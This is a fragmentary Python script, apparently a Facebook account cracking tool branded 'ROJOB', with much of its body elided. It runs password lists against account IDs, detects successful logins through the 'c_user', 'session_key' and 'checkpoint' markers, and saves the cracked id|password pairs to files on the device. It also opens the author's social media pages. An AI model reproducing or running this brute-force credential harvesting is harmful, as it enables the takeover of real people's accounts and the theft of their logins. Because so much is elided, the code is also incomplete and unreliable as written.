...
import os,base64
os.system("xdg-open https://www.facebook.com/KINGXMRROJOB/?ref=share")
...
def menu(): 
	...
	if xd in ['1','01']:
	   ...
	   gmail()
		...
		os.system(f'xdg-open https://m.me/KINGXMRROJOB');menu()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\r\r\033[1;32m [ROJOB-0K] %s | %s'%(ids,pas))
				open('/sdcard/ROJOB-0K.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m [ROJOB-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/ROJOB-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def rcrack1(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [ROJOB-0K] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/ROJOB-0K.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						...
						print(f'\r\x1b[1;32m [ROJOB-0K] '+ids+' | '+pas)
...
==================================================   """)
  ...
  os.system('xdg-open https://m.me/rojobali72')
  print("");time.sleep(2)
